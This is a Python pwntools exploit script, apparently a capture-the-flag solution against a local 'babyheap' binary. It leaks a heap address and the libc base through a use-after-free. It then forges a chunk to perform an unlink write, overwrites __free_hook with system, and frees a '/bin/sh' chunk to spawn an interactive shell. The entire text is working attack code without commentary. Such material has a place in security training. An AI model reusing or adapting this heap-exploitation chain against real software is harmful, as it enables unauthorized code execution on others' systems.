from pwn import *
#context.log_level="debug"
def cmd(c):
	p.sendlineafter("Choice:",str(c))
def add(idx,c=""):
	cmd(1)
	p.sendlineafter("Index:",str(idx))
	p.sendlineafter("Content:",c)
def edit(idx,c):
	cmd(2)
	p.sendlineafter("Index:",str(idx))
	p.sendlineafter("Content:",c)
def add_1(idx,c):
	cmd(1)
	p.sendlineafter("Index:",str(idx))
	p.sendafter("Content:",c)
def show(idx):
	cmd(3)
	p.sendlineafter("Index:",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter("Index:",str(idx))

ptr=0x602068+6*8
p=process("./babyheap")
libc=ELF("/mlibc/64/lib/libc-2.23.so")
#start leak#
add(0,p64(0)+p64(0x31))
add(1)
free(1)
free(0)
show(0)
data=p.readline()
heap=u64(data[:-1].ljust(8,"\0"))-(0x1e94030-0x1e94000)
log.warning(hex(heap))
#leaking heap over and start to make lap#
edit(1,p64(heap+0x10))
add(2)
add(3)
add_1(4,p64(0)+p64(0)+p64(0)+p64(0xa1))
add(5,"/bin/sh")
add(6)
add_1(7,p64(0)+p64(0x31)+p64(ptr-0x18)+p64(ptr-0x10))
add(8,p64(0)+p64(0x30))
#to deal with the next_chunk's pre_inuse#
free(1)
show(1)
data=p.readline()
base=u64(data[:-1].ljust(8,"\0"))-(0x00007ffff7dd4b78-0x7ffff7a39000)
log.warning(hex(base))
libc.address=base
edit(7,p64(libc.symbols['__free_hook']))
edit(4,p64(libc.symbols['system']))
add(9,"/bin/sh")
free(9)
p.interactive(">")
